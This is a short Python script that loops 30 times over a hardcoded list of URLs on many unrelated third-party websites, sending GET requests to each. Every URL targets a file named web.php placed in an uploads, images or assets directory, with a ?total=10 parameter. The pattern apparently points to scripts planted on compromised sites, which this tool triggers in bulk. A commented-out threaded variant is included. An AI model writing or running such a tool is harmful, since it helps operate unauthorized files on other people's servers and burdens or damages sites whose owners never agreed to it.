from requests_html import HTMLSession
import _thread
import time

session = HTMLSession()

url_list=["http://www.nongzhile.com/uploads/soft/web.php?total=10","http://bcsrx.com/uploads/140604/web.php?total=10","http://www.clubhna.com/uploads/170622/web.php?total=10","http://www.syky958.com/uploads/160406/web.php?total=10","http://www.ynzjty.com/a/guanyu/web.php?total=10","http://www.jyspe.com/uploads/140607/web.php?total=10","http://0574mg.com/a/bywh/web.php?total=10","http://jxyns.com/images/web.php?total=10","http://www.92yuepa.com/uploads/160406/web.php?total=10","http://yize58.com/uploads/litimg/web.php?total=10","http://www.weiai52.com/a/yule/web.php?total=10","http://www.fh8edd.com/uploads/allimg/web.php?total=10","http://www.575yx.com/uploads/allimg/c170622/web.php?total=10","http://znkhd.com/uploads/allimg/160109/web.php?total=10","http://xiaonitv.com/uploads/150302/web.php?total=10","http://hjfw.net/uploads/userup/web.php?total=10","http://www.997db.com/uploads/allimg/170622/web.php?total=10","http://www.wodcq.com/uploads/allimg/140504/web.php?total=10","http://changsir.cn/wordpress/wp-content/uploads/2017/web.php?total=10","http://changsir.cn/wordpress/wp-content/uploads/2017/web.php?total=10","http://fast.watch.kct99.com/assets/addons/crontab/web.php?total=10","http://watch.kct99.com/assets/19d0a61b/web.php?total=10","t1.kct99.com/assets/354d7562/web.php?total=10"]

i=30 #循环次数
for j in range(i):
    for url in url_list:
        try:
            print(url)
            session.get(url,timeout=5)
        except:
            pass


#定义线程函数
# def get_url(s_url):
#     print(s_url)
#     session.get(s_url,timeout=5)
    
# try:
#     for url in url_list:        
#         _thread.start_new_thread(get_url,(url,1,))
        
    
# except:
#     print("error")